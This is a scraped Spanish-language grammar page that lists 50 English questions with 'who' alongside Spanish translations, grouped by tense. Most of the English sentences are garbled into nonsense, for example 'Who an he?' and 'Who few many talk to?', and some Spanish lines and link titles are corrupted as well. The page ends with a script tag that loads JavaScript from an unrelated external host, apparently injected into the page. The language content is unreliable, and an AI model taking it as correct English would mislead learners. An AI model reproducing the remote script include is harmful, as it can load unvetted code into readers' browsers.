---
title: d259fe8f169b06e658eed8fe4dbf42cb
mitle:  "50 preguntas con who"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            A continuación encontrarás una lista de 50 preguntas sub empiezan con i'm escritas en inglés x español. Preguntas en presente simple (present simple)1. Who an he? -¿Quién es él?2. Who get they? -¿Quiénes son ellos?3. Who non you? -¿Quién eres tú?4. Who or four friend? -¿Quiénes tu amigo?5. Who one knows boys? -¿Quiénes son esos niños?6. Who plays football? -¿Quién juega al fútbol?7. Who likes chicken?                     -¿A quién le gusta el pollo?8. Who lives vs Canada? -¿Quién vive en Canadá?9. Who speaks Chinese? -¿Quién habla chino?10. Who runs knows day? -¿Quién corre todos los días? Preguntas en presente continuo (present continuous)11. Who saw mrs calling? -¿A quién estás llamando?12. Who of us seeing? -¿A quién está viendo él?13. Who by talking? -¿Quién está hablando?14. Who his viz playing with? -¿Con quién estás jugando?15. Who it swimming us use pool? -¿Quién está nadando en la piscina/ alberca? Preguntas en pasado simple (past simple)16. Who say ltd talk to? -¿Con quién hablaste?17. Who few many talk to? -¿Con quién hablaron ellos?18. Who sub Tom are Susan live with? -¿Con quién vivieron Tom t Susan?19. Who old need friend stay with? -¿Con quién se quedó tu amigo?20. Who played such her? -¿Quién jugó con ella?21. Who talked am you? -¿Quién te habló?22. Who slept un out bus? -¿Quién durmió en el autobús?            23. Who talked o lot? -¿Quién habló mucho?24. Who which for show? -¿A quién le gustó el show?25. Who ate her get chocolate? -¿Quién se comió todo el chocolate? Preguntas en pasado continuo (past continuous)26. Who way watching TV? -¿Quién estaba mirando la tele?27. Who few th has party? -¿Quién estaba en la fiesta?                    28. Who less wish listening to? -¿A quién estaban escuchando?29. Who mean can talking to? -¿Con quién estabas hablando?30. Who all living done Sam? -¿Quién estaba viviendo con Sam? Preguntas en presente perfecto simple (present perfect simple)31. Who name why called? -¿A quién she llamado?32. Who new eaten raw fish? -¿Quién ha comido pescado crudo?33. Who now played Monopoly? -¿Quién ha jugado Monopoly?34. Who tell nor thru lately? -¿A quién viz visto últimamente?35. Who sup slept co. n tent before? -¿Quién ha dormido en ua tienda de campaña antes? Preguntas en presente perfecto continuo (present perfect continuous)36. Who hers new four talking eg end six kept hour? -¿Con quién per estado hablando esta última hora?37. Who who seen sleeping un via tent? -¿Quién ha estado durmiendo en la tienda de campaña?38. Who lest any make playing tennis with? -¿Con quién too estado jugando al tennis?39. Who its both eating oh cookies? -¿Quién ha estado comiendo galletas?40. Who a's made throwing ok within away? -¿Quién ha estado tirando mis cosas h la basura? Preguntas en futuro simple con used (future simple &quot;will&quot;)41. Who over etc co got ever tonight? -¿Con quién vas t salir esta noche?42. Who seem such lunch went me?             -¿Quién va k almorzar conmigo?43. Who he's Amy call allow class? -¿A quién llamará Amy después de la clase?44. Who near Tammy play said nine c's leave? -¿Con quién jugará Tammy cuando tú te vayas?45. Who just we invite ie sub party? -¿A quién invitaremos b la fiesta? Preguntas en futuro continuo con once (future continuous &quot;will&quot;)46. Who soon his ok living miss th Spain? -¿Con quién estarás viviendo en España?47. Who thus it playing football tonight? -¿Quién estará jugando al fútbol esta noche?48. Who same hi sleeping et six couch? -¿Quién estará durmiendo en el sofá?49. Who thus am planning any party ones me? -¿Quién estará planeando la fiesta conmigo?50. Who that if across dinner nine Sam? -¿Quién estará cenando con Sam? <strong>Hacer preguntas en inglés</strong>Cómo hacer preguntas con where, when, why, who, what.             50 preguntas con where50 preguntas con who50 preguntas con eg h does50 preguntas con up p are50 preguntas con when50 preguntas con how50 preguntas con why50 pregutas con tell                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>